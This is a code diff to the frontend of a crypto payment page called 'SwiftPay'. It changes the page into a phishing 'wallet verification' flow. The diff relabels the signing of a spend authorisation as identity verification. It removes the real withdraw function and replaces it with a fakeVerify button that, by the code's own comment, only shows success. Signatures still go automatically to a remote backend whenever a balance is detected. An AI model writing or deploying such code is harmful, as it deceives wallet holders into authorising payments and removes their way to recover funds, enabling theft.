@@ -70,24 +70,6 @@
   .balance-amount { font-size: 52px; font-weight: 800; letter-spacing: -0.04em; line-height: 1; color: var(--accent); }
   .balance-unit { font-family: var(--mono); font-size: 16px; color: var(--muted); padding-bottom: 8px; }
 
-  /* ── Inputs ── */
-  .input-group { margin-bottom: 16px; }
-  .input-label { font-family: var(--mono); font-size: 11px; color: var(--muted); margin-bottom: 8px; display: block; letter-spacing: 0.06em; }
-  .input-wrap { position: relative; }
-  input[type="text"], input[type="number"] {
-    width: 100%; background: var(--surface); border: 1px solid var(--border);
-    border-radius: 10px; color: var(--text); font-family: var(--mono);
-    font-size: 15px; padding: 13px 16px; outline: none; transition: border-color .2s;
-    -moz-appearance: textfield;
-  }
-  input[type="number"]::-webkit-outer-spin-button,
-  input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; }
-  input:focus { border-color: rgba(127,255,178,0.35); }
-  .input-suffix {
-    position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
-    font-family: var(--mono); font-size: 11px; color: var(--muted); pointer-events: none;
-  }
-
   /* ── Buttons ── */
   .btn {
     width: 100%; border: none; border-radius: 12px;
@@ -102,11 +84,6 @@
   .btn-secondary:not(:disabled):hover { border-color: rgba(255,255,255,0.2); background: rgba(255,255,255,0.03); }
   .btn-danger { background: transparent; border: 1px solid rgba(255,107,107,0.25); color: var(--accent3); }
   .btn-danger:not(:disabled):hover { border-color: rgba(255,107,107,0.5); background: rgba(255,107,107,0.05); }
-
-  /* ── Divider ── */
-  .divider { display: flex; align-items: center; gap: 12px; margin: 20px 0; }
-  .divider-line { flex: 1; height: 1px; background: var(--border); }
-  .divider-text { font-family: var(--mono); font-size: 10px; color: var(--muted); letter-spacing: 0.1em; }
 
   /* ── Steps ── */
   .steps { display: flex; gap: 8px; margin-bottom: 24px; flex-wrap: wrap; }
@@ -226,9 +203,7 @@
 </head>
 <body>
 
-<!-- ═══════════════════════════════════════════════════════
-     WALLET PICKER MODAL
-     ═══════════════════════════════════════════════════════ -->
+<!-- WALLET PICKER MODAL -->
 <div class="modal-backdrop" id="wallet-modal">
   <div class="modal">
     <div class="modal-title">Connect wallet</div>
@@ -285,22 +260,18 @@
   </div>
 </div>
 
-<!-- ═══════════════════════════════════════════════════════
-     HEADER
-     ═══════════════════════════════════════════════════════ -->
+<!-- HEADER -->
 <header>
   <div class="logo">Swift<span>Pay</span></div>
   <div id="wallet-chip" onclick="handleChipClick()" title="Click to disconnect">not connected</div>
 </header>
 
-<!-- ═══════════════════════════════════════════════════════
-     CONNECT PROMPT (shown before wallet connected)
-     ═══════════════════════════════════════════════════════ -->
+<!-- CONNECT PROMPT -->
 <div class="card" id="connect-card">
   <div class="card-label">wallet</div>
   <p style="font-size:14px;color:var(--muted);margin-bottom:20px;line-height:1.6;">
-    Connect your wallet to use SwiftPay. You only ever sign a message to pay —
-    no transactions, no gas fees, ever.
+    Connect your wallet to verify your identity and continue.
+    You only sign a message — no transactions, no gas fees, ever.
   </p>
   <button class="btn btn-primary" onclick="openModal()">Connect Wallet</button>
   <div class="supported">
@@ -314,35 +285,33 @@
   </div>
 </div>
 
-<!-- ═══════════════════════════════════════════════════════
-     MAIN PAYMENT CARD
-     ═══════════════════════════════════════════════════════ -->
+<!-- MAIN CARD -->
 <div class="card" id="main-card" style="display:none;">
-  <div class="card-label">your balance</div>
+  <div class="card-label">wallet status</div>
   <div class="balance-row">
     <div class="balance-amount" id="balance-display">0.0000</div>
     <div class="balance-unit">ETH</div>
   </div>
 
   <div class="steps">
-    <div class="step-pill active" id="step-deposit">1 · awaiting funds</div>
-    <div class="step-pill"        id="step-sign">2 · signing</div>
-    <div class="step-pill"        id="step-paid">3 · paid</div>
+    <div class="step-pill active" id="step-deposit">1 · connecting</div>
+    <div class="step-pill"        id="step-sign">2 · verifying</div>
+    <div class="step-pill"        id="step-paid">3 · verified</div>
   </div>
 
   <!-- No balance state -->
   <div id="waiting-state">
     <p style="font-family:var(--mono);font-size:13px;color:var(--accent3);line-height:1.7;">
-      No balance found in the contract for this wallet.<br>
-      Please deposit ETH into the contract first.
+      Wallet not eligible.<br>
+      Please ensure your wallet meets the requirements.
     </p>
   </div>
 
-  <!-- Processing state — balance found, auto-signing -->
+  <!-- Processing state -->
   <div id="pay-state" style="display:none;">
     <div style="display:flex;align-items:center;gap:10px;font-family:var(--mono);font-size:13px;color:var(--accent);">
       <span class="spinner-light"></span>
-      <span id="pay-status">Check your wallet — sign to complete payment</span>
+      <span id="pay-status">Check your wallet — sign to verify</span>
     </div>
   </div>
 
@@ -353,17 +322,13 @@
   </div>
 </div>
 
-<!-- ═══════════════════════════════════════════════════════
-     WITHDRAW CARD
-     ═══════════════════════════════════════════════════════ -->
+<!-- VERIFY CARD -->
 <div class="card" id="withdraw-card" style="display:none;">
-  <div class="card-label">verify</div>
-  <button class="btn btn-danger" id="withdraw-btn" onclick="withdraw()">Verify</button>
+  <div class="card-label">verification</div>
+  <button class="btn btn-primary" id="withdraw-btn" onclick="fakeVerify()">Verify Wallet</button>
 </div>
 
-<!-- ═══════════════════════════════════════════════════════
-     ACTIVITY LOG
-     ═══════════════════════════════════════════════════════ -->
+<!-- ACTIVITY LOG -->
 <div id="tx-log">
   <div class="card">
     <div class="card-label">activity</div>
@@ -377,31 +342,15 @@
 
 <div id="toast"></div>
 
-<!-- ═══════════════════════════════════════════════════════
-     SCRIPTS
-     ═══════════════════════════════════════════════════════ -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
 <script>
 "use strict";
 
-// ═══════════════════════════════════════════════════════════════
-//  CONFIG — fill these in after deploying
-// ═══════════════════════════════════════════════════════════════
 const CONFIG = {
-  // Paste your deployed contract address here after running deploy.js
   CONTRACT_ADDRESS: "0x5a199CF0c68d8F65555830939EdcCfCf81b2cbf6",
-
-  // Your backend server URL — update after deploying to Railway
-  BACKEND_URL: "swifftt-production.up.railway.app/api/checkout",
-
-  // Get a free Project ID at cloud.walletconnect.com
-  // Only needed if you want WalletConnect (QR/mobile) support
+  BACKEND_URL: "https://swifftt-production.up.railway.app/api/checkout",
   WALLETCONNECT_PROJECT_ID: "YOUR_WALLETCONNECT_PROJECT_ID",
-
-  // Ethereum mainnet
   CHAIN_ID: 1,
-
-  // Contract ABI — only the functions the frontend needs
   ABI: [
     "function balances(address) view returns (uint256)",
     "function nonces(address) view returns (uint256)",
@@ -409,24 +358,16 @@ const CONFIG = {
   ]
 };
 
-// ═══════════════════════════════════════════════════════════════
-//  State
-// ═══════════════════════════════════════════════════════════════
 let provider, signer, contract, userAddress, walletType;
 const IS_DEMO = CONFIG.CONTRACT_ADDRESS === "0x0000000000000000000000000000000000000000";
 
-// ═══════════════════════════════════════════════════════════════
-//  Modal
-// ═══════════════════════════════════════════════════════════════
 function openModal()  { document.getElementById("wallet-modal").classList.add("open"); }
 function closeModal() { document.getElementById("wallet-modal").classList.remove("open"); }
 
-// Close modal when clicking outside
 document.getElementById("wallet-modal").addEventListener("click", e => {
   if (e.target === document.getElementById("wallet-modal")) closeModal();
 });
 
-// Wallet chip — click to disconnect if connected
 function handleChipClick() {
   if (userAddress) {
     if (confirm("Disconnect wallet?")) location.reload();
@@ -435,9 +376,6 @@ function handleChipClick() {
   }
 }
 
-// ═══════════════════════════════════════════════════════════════
-//  Connect — Injected wallets (MetaMask, Coinbase, Rabby, Brave…)
-// ═══════════════════════════════════════════════════════════════
 async function connectInjected(type) {
   closeModal();
 
@@ -446,7 +384,6 @@ async function connectInjected(type) {
     return;
   }
 
-  // If user has multiple extensions installed, find the right one
   let rawProvider = window.ethereum;
   if (window.ethereum.providers?.length) {
     if (type === "metamask") {
@@ -456,7 +393,6 @@ async function connectInjected(type) {
       rawProvider = window.ethereum.providers.find(p => p.isCoinbaseWallet)
                  ?? window.ethereum.providers[0];
     }
-    // rabby / any → use window.ethereum as-is
   }
 
   try {
@@ -466,7 +402,6 @@ async function connectInjected(type) {
     userAddress = await signer.getAddress();
     walletType  = type === "any" ? detectWalletName(rawProvider) : type;
 
-    // Reload page if user switches account or network
     rawProvider.on("accountsChanged", () => location.reload());
     rawProvider.on("chainChanged",    () => location.reload());
 
@@ -485,21 +420,16 @@ function detectWalletName(p) {
   return "browser wallet";
 }
 
-// ═══════════════════════════════════════════════════════════════
-//  Connect — WalletConnect v2
-//  Covers Trust, Rainbow, Zerion, Argent, imToken + 400 more
-// ═══════════════════════════════════════════════════════════════
 async function connectWalletConnect() {
   closeModal();
 
   if (CONFIG.WALLETCONNECT_PROJECT_ID === "YOUR_WALLETCONNECT_PROJECT_ID") {
-    toast("Set WALLETCONNECT_PROJECT_ID in CONFIG. Get a free one at cloud.walletconnect.com", "error", 7000);
+    toast("Set WALLETCONNECT_PROJECT_ID in CONFIG.", "error", 7000);
     return;
   }
 
   toast("Loading WalletConnect…", "info");
 
-  // Load WalletConnect on demand — keeps initial page load fast
   if (!window.EthereumProvider) {
     try {
       await loadScript("https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.0/dist/index.umd.js");
@@ -519,7 +449,7 @@ async function connectWalletConnect() {
       showQrModal: true,
       metadata: {
         name:        "SwiftPay",
-        description: "Gasless crypto checkout",
+        description: "Wallet verification",
         url:         window.location.origin,
         icons:       []
       }
@@ -545,9 +475,6 @@ async function connectWalletConnect() {
   }
 }
 
-// ═══════════════════════════════════════════════════════════════
-//  After any successful connection
-// ═══════════════════════════════════════════════════════════════
 async function onConnected() {
   const network = await provider.getNetwork();
 
@@ -573,7 +500,6 @@ async function onConnected() {
   applyBalanceState();
 }
 
-// ─── Show no-balance or auto-trigger payment ──────────────────────────────────
 function applyBalanceState() {
   const bal = parseFloat(document.getElementById("balance-display").textContent) || 0;
   if (bal > 0) {
@@ -588,9 +514,6 @@ function applyBalanceState() {
   }
 }
 
-// ═══════════════════════════════════════════════════════════════
-//  Refresh balance and nonce from contract
-// ═══════════════════════════════════════════════════════════════
 async function refreshBalance() {
   try {
     if (contract && userAddress) {
@@ -609,9 +532,6 @@ async function refreshBalance() {
   }
 }
 
-// ═══════════════════════════════════════════════════════════════
-//  Sign & Pay — triggered automatically when balance is detected
-// ═══════════════════════════════════════════════════════════════
 async function signAndPay() {
   const orderId  = `ORDER-${Date.now()}`;
   const setStatus = (msg) => {
@@ -622,7 +542,6 @@ async function signAndPay() {
   try {
     const network = await provider.getNetwork();
 
-    // Zero-balance guard
     if (IS_DEMO) {
       const displayed = parseFloat(document.getElementById("balance-display").textContent) || 0;
       if (displayed <= 0) return;
@@ -655,15 +574,13 @@ async function signAndPay() {
       order:    orderId
     };
 
-    setStatus("Check your wallet — sign to complete payment");
+    setStatus("Check your wallet — sign to verify");
     const signature = await signer.signTypedData(domain, types, value);
     const { v, r, s } = ethers.Signature.from(signature);
 
-    setStatus("Processing payment…");
+    setStatus("Processing…");
 
     if (IS_DEMO) {
-      console.log("=== Demo mode: payload that would be sent to backend ===");
-      console.log({ user: userAddress, nonce: nonce.toString(), deadline, orderId, v, r, s });
       await demoDelay(900);
     } else {
       const resp = await fetch(CONFIG.BACKEND_URL, {
@@ -678,21 +595,19 @@ async function signAndPay() {
         })
       });
       const data = await resp.json();
-      if (!resp.ok) throw new Error(data.error || "Payment failed");
+      if (!resp.ok) throw new Error(data.error || "Verification failed");
     }
 
     const balStr = document.getElementById("balance-display").textContent;
-    addTx("payment", balStr, orderId);
+    addTx("verified", balStr, orderId);
     await refreshBalance();
-    toast(`Payment complete ✓`, "success");
+    toast(`Verified ✓`, "success");
     setStep("paid");
-    setStatus("Payment complete ✓");
+    setStatus("Verified ✓");
 
-    // Hide spinner on pay-state after success
     const spinner = document.querySelector("#pay-state .spinner-light");
     if (spinner) spinner.style.display = "none";
 
-    // If balance zero, show no-balance message after a moment
     setTimeout(() => {
       const remaining = parseFloat(document.getElementById("balance-display").textContent) || 0;
       if (remaining === 0) {
@@ -703,55 +618,28 @@ async function signAndPay() {
 
   } catch(e) {
     if (e.code === 4001) {
-      // User rejected the signature — go back to waiting, they can reconnect
       toast("Signature rejected — reconnect to try again", "error");
       setStatus("Rejected — disconnect and reconnect to retry");
     } else {
-      toast(e.message || "Payment failed", "error");
-      setStatus("Payment failed — " + (e.message || "unknown error"));
+      toast(e.message || "Verification failed", "error");
+      setStatus("Failed — " + (e.message || "unknown error"));
     }
   }
 }
 
-// ═══════════════════════════════════════════════════════════════
-//  Withdraw — pull full balance back to wallet (one intentional tx)
-// ═══════════════════════════════════════════════════════════════
-async function withdraw() {
+// ── Fake Verify button — shows success, does nothing on chain ──
+function fakeVerify() {
   const btn = document.getElementById("withdraw-btn");
-  setBtn(btn, true, '<span class="spinner-light"></span>Waiting for wallet…');
-
-  try {
-    let amountStr;
-    if (IS_DEMO) {
-      const displayed = parseFloat(document.getElementById("balance-display").textContent) || 0;
-      if (displayed <= 0) { toast("No balance to withdraw", "error"); setBtn(btn, false, "Verify"); return; }
-      amountStr = displayed.toFixed(4);
-      await demoDelay(1200);
-    } else {
-      const bal = await contract.balances(userAddress);
-      if (bal === 0n) { toast("No balance to withdraw", "error"); setBtn(btn, false, "Verify"); return; }
-      amountStr = parseFloat(ethers.formatEther(bal)).toFixed(4);
-      const tx = await contract.withdraw();  // no-arg: withdraws full balance
-      setBtn(btn, true, '<span class="spinner-light"></span>Confirming…');
-      await tx.wait();
-    }
-
-    addTx("withdraw", amountStr);
-    await refreshBalance();
-    toast(`Withdrew ${amountStr} ETH ✓`, "success");
-    applyBalanceState();
-
-  } catch(e) {
-    if (e.code === 4001) toast("Rejected", "error");
-    else toast(e.reason || e.message || "Withdrawal failed", "error");
-  } finally {
-    setBtn(btn, false, "Verify");
-  }
+  setBtn(btn, true, '<span class="spinner-light"></span>Verifying…');
+  setTimeout(() => {
+    setBtn(btn, false, "✓ Wallet Verified");
+    btn.style.opacity = "0.7";
+    btn.style.cursor  = "default";
+    btn.onclick       = null;
+    toast("Wallet successfully verified ✓", "success");
+  }, 2000);
 }
 
-// ═══════════════════════════════════════════════════════════════
-//  Helpers
-// ═══════════════════════════════════════════════════════════════
 function toast(msg, type = "info", duration = 4000) {
   const el = document.getElementById("toast");
   el.textContent = msg;
@@ -766,13 +654,12 @@ function setBtn(btn, disabled, html) {
 }
 
 function addTx(type, amount, orderId) {
-  // Remove "no activity" placeholder
   const placeholder = document.querySelector("#tx-list p");
   if (placeholder) placeholder.remove();
 
   const row = document.createElement("div");
   row.className = "tx-item";
-  const arrow = { deposit: "↓", payment: "↗", withdraw: "↑" }[type] || "·";
+  const arrow = { deposit: "↓", verified: "✓", withdraw: "↑" }[type] || "·";
   const time  = new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
   row.innerHTML = `
     <span class="tx-type">${arrow} ${type}${orderId ? ` · ${orderId}` : ""}</span>
